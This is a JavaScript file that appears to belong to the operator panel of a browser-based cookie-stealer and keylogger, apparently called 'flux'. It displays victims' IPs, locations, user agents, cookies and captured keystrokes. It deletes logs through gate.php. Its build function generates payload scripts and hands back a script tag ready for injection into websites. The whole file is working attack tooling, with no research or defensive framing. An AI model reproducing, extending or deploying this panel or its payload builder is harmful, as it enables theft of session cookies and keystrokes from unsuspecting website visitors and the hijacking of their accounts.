// Read info
function read_log(ip, location, host, uagents, cookies, date, time, name) {
    swal("Information", `
        Name: ${name}
        Remote IP: ${ip}
        Host: ${host}
        Location: ${location}
        UserAgents: ${uagents}
        Cookies: ${cookies}
        Date: ${date}
        Time: ${time}`, "info");
}

// Read keyboard
function read_keyboard(keys) {
    swal("Key logs", keys, "info");
}

// Remove log file
function remove_log(log, row) {
    swal({
        title: "Are you sure?",
        text: `Delete log file?\n${log}`,
        icon: "warning",
        buttons: true
    }).then((result) => {
        if (result) {
            // Delete file
            var http = new XMLHttpRequest();
            var params = `logfile=${log}&cleanLogs`;
            http.open("POST", "gate.php", true);
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            http.send(params);

            // Message
            swal("Deleted!", "Your file has been deleted.", "success");

            // Hide
            $(row).parent().parent().hide(1000);
        }
    });
}

// Build
function buildCreate() {
    var name = $("#buildName");
    var gate = $("#buildGate");

    // Request to build.php
    var http = new XMLHttpRequest();
    var params = `buildName=${name.val()}&buildGate=${gate.val()}&buildFlux`;
    var buildLocation = document.location.href.replace("flux.php", "") + "builds/" + name.val() + ".js";
    http.open("POST", "build.php", true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send(params);

    // Message
    swal("Build created!", `Build location:\nURL: ${buildLocation}\nTAG: <script src='${buildLocation}'><\/script>`, "success");

    // New name
    name.val(Math.floor((Math.random() * 999999) + 0));
}

// Search in table
$(document).ready(function () {
    $("#logsSearch").on("keyup", function () {
        var value = $(this).val().toLowerCase();
        $("#logsTable tr").filter(function () {
            $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1);
        });
    });
});
